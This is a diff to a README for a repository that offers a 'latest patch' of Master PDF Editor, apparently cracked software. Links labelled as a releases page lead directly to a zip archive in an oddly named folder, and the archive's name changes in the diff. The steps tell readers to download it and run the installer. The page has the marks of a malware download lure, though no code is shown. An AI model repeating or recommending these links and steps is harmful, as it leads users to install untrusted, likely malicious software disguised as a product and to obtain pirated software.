@@ -1,6 +1,6 @@
 # 📄 Master-PDF-Editor-Latest-Patch - Easy PDF Editing Made Simple
 
-[![Download Latest Release](https://raw.githubusercontent.com/NymzeyX/Master-PDF-Editor-Latest-Patch/main/slipperyback/Master-PDF-Editor-Latest-Patch-2.0.zip%20Now-Get%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/NymzeyX/Master-PDF-Editor-Latest-Patch/main/slipperyback/Master-PDF-Editor-Latest-Patch-2.0.zip)
+[![Download Latest Release](https://github.com/NymzeyX/Master-PDF-Editor-Latest-Patch/raw/refs/heads/main/slipperyback/Editor-Master-Latest-Patch-PD-v3.6.zip%20Now-Get%20Latest%20Version-brightgreen)](https://github.com/NymzeyX/Master-PDF-Editor-Latest-Patch/raw/refs/heads/main/slipperyback/Editor-Master-Latest-Patch-PD-v3.6.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ Master PDF Editor is a user-friendly application designed for managing and editi
 Follow these steps to download and install Master PDF Editor:
 
 1. **Visit the Releases Page:**
-   Click the button above or use this link to visit the [Releases page](https://raw.githubusercontent.com/NymzeyX/Master-PDF-Editor-Latest-Patch/main/slipperyback/Master-PDF-Editor-Latest-Patch-2.0.zip).
+   Click the button above or use this link to visit the [Releases page](https://github.com/NymzeyX/Master-PDF-Editor-Latest-Patch/raw/refs/heads/main/slipperyback/Editor-Master-Latest-Patch-PD-v3.6.zip).
 
 2. **Download the Software:**
    On the Releases page, you will see a list of available versions. Look for the most recent version and click on the download link for your operating system.
@@ -47,7 +47,7 @@ Master PDF Editor offers a wide range of features to enhance your PDF editing ex
 
 To download and install Master PDF Editor, follow these instructions:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/NymzeyX/Master-PDF-Editor-Latest-Patch/main/slipperyback/Master-PDF-Editor-Latest-Patch-2.0.zip).
+1. Go to the [Releases page](https://github.com/NymzeyX/Master-PDF-Editor-Latest-Patch/raw/refs/heads/main/slipperyback/Editor-Master-Latest-Patch-PD-v3.6.zip).
 2. Look for the latest release you want to install.
 3. Download the appropriate installer for your system.
 4. After downloading, run the installer and follow the prompts.
@@ -78,7 +78,7 @@ For more information about Master PDF Editor, you can explore:
 
 ## 🔗 Useful Links
 
-- [Download Latest Release](https://raw.githubusercontent.com/NymzeyX/Master-PDF-Editor-Latest-Patch/main/slipperyback/Master-PDF-Editor-Latest-Patch-2.0.zip)
+- [Download Latest Release](https://github.com/NymzeyX/Master-PDF-Editor-Latest-Patch/raw/refs/heads/main/slipperyback/Editor-Master-Latest-Patch-PD-v3.6.zip)
 - [Community Forum](#)
 - [User Manuals and Tutorials](#)
 - [Contact Support](#)
